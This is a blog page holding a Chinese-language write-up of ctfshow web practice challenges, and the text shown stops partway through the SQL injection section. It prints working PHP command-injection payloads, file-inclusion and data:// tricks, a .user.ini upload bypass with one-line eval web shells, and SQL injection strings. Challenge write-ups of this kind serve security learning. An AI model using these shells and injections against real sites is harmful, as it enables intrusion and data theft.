@@ -1,0 +1,991 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    ctfshow-web-wp | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="ctfshow-web-wp ctfshow web入门篇（部分）  一、命令执行  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Las">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web-wp">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/07/21/ctfshow-web-wp/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="ctfshow-web-wp ctfshow web入门篇（部分）  一、命令执行  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Las">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-07-21T02:01:34.000Z">
+<meta property="article:modified_time" content="2026-07-31T13:29:33.161Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/atom.xml">
+          <span class="main-nav-link">rss</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="ctfshow-web-wp">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">ctfshow-web-wp</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="6868625065"
+        server="netease"
+        type="playlist"
+        
+        
+        autoplay="false"
+        loop="all"
+        order="list"
+        
+        volume="0.7"
+        mutex="true"
+        
+        
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web-wp"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow-web-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web30"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web38"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web74"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web151"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.web151</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web152"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.web152</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web153"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 3.web153</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web154"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 4.web154</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web155"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 5.web155</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web171"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web172"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web173"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web174"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web175"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 5.web175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6web176"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 6.web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7web177"><span class="toc-number">1.3.7.</span> <span class="toc-text"> 7.web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8web178"><span class="toc-number">1.3.8.</span> <span class="toc-text"> 8.web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9web179"><span class="toc-number">1.3.9.</span> <span class="toc-text"> 9.web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10web180"><span class="toc-number">1.3.10.</span> <span class="toc-text"> 10.web180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11web181"><span class="toc-number">1.3.11.</span> <span class="toc-text"> 11.web181</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-xss"><span class="toc-number">1.4.</span> <span class="toc-text"> 四、xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web316"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 1.web316</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web317"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 2.web317</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web318319"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 3.web318&amp;319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web320-326"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 4.web320-326</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web327"><span class="toc-number">1.4.5.</span> <span class="toc-text"> 5.web327</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-java"><span class="toc-number">1.5.</span> <span class="toc-text"> 五、java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web279"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 1.web279</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web280"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 2.web280</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web281"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 3.web281</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-ssti"><span class="toc-number">1.6.</span> <span class="toc-text"> 六、SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web361"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1.web361</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web362"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2.web362</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83-ssrf"><span class="toc-number">1.7.</span> <span class="toc-text"> 七、SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web351"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 1.web351</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web352"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 2.web352</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-ctfshow-web-wp" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-07-21T02:01:34.000Z" itemprop="datePublished">2026-07-21</time>
+    <time style="display: none;" id="post-update-time">2026-07-31</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="ctfshow-web-wp"><a class="markdownIt-Anchor" href="#ctfshow-web-wp"></a> ctfshow-web-wp</h1>
+<p>ctfshow web入门篇（部分）</p>
+<h2 id="一-命令执行"><a class="markdownIt-Anchor" href="#一-命令执行"></a> 一、命令执行</h2>
+<h3 id="1web29"><a class="markdownIt-Anchor" href="#1web29"></a> 1.web29</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>非常简单不多说直接上payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://e1c8a274-c9ed-4d9d-9efa-b8eb3e052baa.challenge.ctf.show/?c=system(&#x27;cat fl*&#x27;);</span><br></pre></td></tr></table></figure>
+<p><strong>ctfshow{de157d64-7dc2-4a01-af46-6582c7cbb94b}</strong></p>
+<h3 id="2web30"><a class="markdownIt-Anchor" href="#2web30"></a> 2.web30</h3>
+<p>和29差不多</p>
+<p>采用include和php伪协议</p>
+<p>由于过滤检查的是c参数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">    eval($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们构造c参数的值就可以绕过过滤:</p>
+<p>c=include&quot;$_GET[url]&quot;?&gt;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//f0f5cf03-da5d-4bf8-8537-bc24cbf8a1d2.challenge.ctf.show/?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDoxNDowNw0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6MTQ6MTcNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWcgPSAnY3Rmc2hvd3tkMzViODM5OC1hOGNjLTQyNzItYWE3Yy1hNjZjZDFlY2FmOGJ9JzsNCg==</span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;d35b8398-a8cc-4272-aa7c-a66cd1ecaf8b&#125;</span><br></pre></td></tr></table></figure>
+<p>当然也可以避开system，直接使用echo</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `cat f*`;</span><br></pre></td></tr></table></figure>
+<p>文件写入也可以，只是我个人不怎么用（）</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=echo`cat ????.??? &gt;&gt; 1.txt`;</span><br></pre></td></tr></table></figure>
+<h3 id="3web38"><a class="markdownIt-Anchor" href="#3web38"></a> 3.web38</h3>
+<p>data</p>
+<p>感觉都差不多随手挑几个做，后面直接跳到最后几题看看就行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:  2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:  h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2020-09-04 05:23:36</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
+<p><strong>ctfshow{f530af8d-3c5f-4b77-ace8-f62bb8c70aa8}</strong></p>
+<h3 id="4web74"><a class="markdownIt-Anchor" href="#4web74"></a> 4.web74</h3>
+<p>不是哥们随便挑一题环境坏了QAQ😡😭</p>
+<p>ps：我就说为什么后面这几题账号那么久没人做，原来是都坏了（）</p>
+<p>后续有遇到新题再补充吧emmmmmm</p>
+<h2 id="二-文件上传"><a class="markdownIt-Anchor" href="#二-文件上传"></a> 二、文件上传</h2>
+<h3 id="1web151"><a class="markdownIt-Anchor" href="#1web151"></a> 1.web151</h3>
+<p>毫无验证的文件上传，直接传一句马就行</p>
+<p>ctfshow{a385903a-f2d9-4cdb-8dbd-3ddc39351367}</p>
+<h3 id="2web152"><a class="markdownIt-Anchor" href="#2web152"></a> 2.web152</h3>
+<p>做完还不知道这题到底做了什么验证，和上一题一样上传一句马就行</p>
+<p>ctfshow{dadd0ed1-a7ca-4712-b749-573735ec90f3}</p>
+<h3 id="3web153"><a class="markdownIt-Anchor" href="#3web153"></a> 3.web153</h3>
+<p>试着创建.user.ini文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=eval.png</span><br></pre></td></tr></table></figure>
+<p>然后发现上传不了</p>
+<p>改后缀为.user.ini.png(如果.htaccess文件不符合也可以这么做)</p>
+<p>抓包再改回来可以上传，然后和以前一样上传一句话木马。</p>
+<p>之前做的题都是去连 /upload/eval.png，而这道题它是要连 /upload/index.php</p>
+<p>木马被自动包含进原来目录里的 php 文件，一般是index.php</p>
+<p>一开始 upload 目录可以访问到，说明 upload 目录中含有 php 文件</p>
+<h3 id="4web154"><a class="markdownIt-Anchor" href="#4web154"></a> 4.web154</h3>
+<p>依旧.user.ini文件</p>
+<p>然后发现对一句话木马存在过滤</p>
+<p>使用短标签绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;? eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;% eval($_POST[1]);%&gt;</span><br></pre></td></tr></table></figure>
+<p>或者使用大小写绕过php：Php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ac75f597-5c21-4036-8366-6db9f0c6d354.challenge.ctf.show/upload/index.php</span><br><span class="line">传入POST数据：1=system(%27tac%20../flag.php%27);</span><br></pre></td></tr></table></figure>
+<p>ctfshow{c59e06a0-8784-449d-a5a1-67468b38232f}</p>
+<h3 id="5web155"><a class="markdownIt-Anchor" href="#5web155"></a> 5.web155</h3>
+<p>同样短标签绕过，但是大小写绕过已经没用了</p>
+<h2 id="三-sql注入"><a class="markdownIt-Anchor" href="#三-sql注入"></a> 三、SQL注入</h2>
+<h3 id="1web171"><a class="markdownIt-Anchor" href="#1web171"></a> 1.web171</h3>
+<p>字符型注入无漏洞</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>得到flag：ctfshow{20ffb6cb-c965-4c66-8f6e-3c4ec71a6b84}</p>
+<h3 id="2web172"><a class="markdownIt-Anchor" href="#2web172"></a> 2.web172</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>题目给了具体结构，不用再进行列行探测，子查询</p>
+<p>所以我们直接使用联合注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select password from ctfshow_user2 where username=&#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure>
+<p>得到flag：ctfshow{81156aaf-c4c1-4dad-a9d2-54039081fe76}</p>
